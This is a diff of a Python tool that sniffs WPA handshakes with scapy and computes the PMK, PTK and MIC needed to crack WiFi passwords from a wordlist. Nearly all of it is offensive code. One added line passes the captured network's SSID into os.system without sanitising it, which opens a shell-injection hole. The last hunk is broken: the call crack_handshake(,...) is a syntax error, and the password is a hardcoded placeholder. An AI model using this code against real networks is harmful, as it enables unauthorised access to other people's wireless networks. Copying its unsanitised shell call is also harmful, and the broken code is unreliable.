@@ -253,6 +253,7 @@ def grab_handshake(ap):
     print("Sniffing " + ap.ssid + "...")
     p = sniff(iface=interface, stop_filter=checkForWPAHandshake) #Sniff for handshake
     print("Handshake Grabbed!")
+    os.system("mv ./handshake/handshake ./handshake/handshake-"+ap.ssid)
     ap.handshake = True     # Save the fact that we have the handshake for this AP
 
 
@@ -287,24 +288,29 @@ def handshake_grabber():
 #       CRACKING FUNCTIONS          #
 #####################################
 
-def customPRF512(key,A,B):
+def calc_ptk(key, A, B):
     blen = 64
-    i    = 0
-    R    = ''
-    while i<=((blen*8+159)/160):
-        hmacsha1 = hmac.new(key,msg=A+bytes(0x00)+B+bytes(i),digestmod='sha1')
-        i+=1
-        R = R+str(hmacsha1.digest())
+    i = 0
+    R = b""
+
+    while i<=((blen*8+159) /160):
+        hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), hashlib.sha1)
+        i += 1
+        R = R + hmacsha1.digest()
+
     return R[:blen]
 
+def calc_pmk(ssid, password):
+    pmk = hashlib.pbkdf2_hmac('sha1', password.encode('ascii'), ssid.encode('ascii'), 4096, 32)
+    return pmk
 
-def crack_handshake(ap,wordlist):
-    packets = rdpcap('./handshake/handshake.pcap') # A Changer
 
-    __NULL_ = b'\x00'
+
+def crack_handshake(pcap,wordlist):
+    packets = rdpcap(pcap)
     ssid = "Test_AP" # à Changer
     psk = "password" # à changer
-    pke = "Pairwise key expansion"    # Standard Set Value
+    pke = b"Pairwise key expansion"
     ap_mac = packets[0].addr2.replace(':','',5)
     cl_mac = packets[0].addr1.replace(':','',5)
     mac_ap = binascii.unhexlify(ap_mac)
@@ -314,28 +320,30 @@ def crack_handshake(ap,wordlist):
     version = bytes(packets[1].getlayer(EAPOL).version)
     p_type = bytes(packets[1].getlayer(EAPOL).type)
     p_len = bytes(packets[1].getlayer(EAPOL).len)
-    mic = binascii.hexlify(packets[1].getlayer(Raw).load)[154:186]
+
+
+    key_data = min(mac_ap, mac_cl) + max(mac_ap, mac_cl) + min(anonce, snonce) + max(anonce, snonce)
+
+    message_integrity_check = binascii.hexlify(packets[1][Raw].load)[154:186]
+    wpa_data = binascii.hexlify(bytes(packets[1][EAPOL]))
+    wpa_data = wpa_data.replace(message_integrity_check, b"0" * 32)
+    wpa_data = binascii.a2b_hex(wpa_data)
+
+
+    pairwise_master_key = calc_pmk(ssid, psk)
+    pairwise_transient_key = calc_ptk(pairwise_master_key, pke, key_data)
+    mic = hmac.new(pairwise_transient_key[0:16], wpa_data, "sha1").hexdigest()
+
+
+    print("PMK : ")
+    print(pairwise_master_key.hex())
+
+    print("PTK :")
+    print(pairwise_transient_key.hex())
+
+    print("MIC : ")
     print(mic)
-    payload = binascii.a2b_hex(binascii.hexlify(bytes(version)\
-                                        +p_type\
-                                        +__NULL_\
-                                        +p_len\
-                                        +binascii.a2b_hex(binascii.hexlify(packets[1].getlayer(Raw).load)[:154])\
-                                        +__NULL_*16\
-                                        +binascii.a2b_hex(binascii.hexlify(packets[1].getlayer(Raw).load)[186:])))
 
-    data = version+p_type+__NULL_+p_len+packets[1].getlayer(Raw).load
-
-
-    key_data = min(mac_ap, mac_cl) + max(mac_ap, mac_cl) + min(anonce,snonce) + max(anonce,snonce)
-    pmk = PBKDF2(psk, ssid, 4096).read(32)
-    ptk = customPRF512(bytes(pmk), bytes(pke,encoding='utf8'), bytes(key_data))
-
-    mic = hmac.new(bytes(ptk[0:16],encoding='utf8'), msg=payload, digestmod='sha1').digest()
-
-    print(binascii.hexlify(mic))
-
-    print("Cracking Handshake...")
 
 def handshake_cracker():
     i = 0
@@ -358,7 +366,8 @@ def handshake_cracker():
         except:
             print("Bad input")
     if valid == True:
-        crack_handshake(ap_list[choice],"./wordlist/wordlist-1")
+        ap = ap_list
+        crack_handshake(,"./wordlist/wordlist-1")
 
 
 
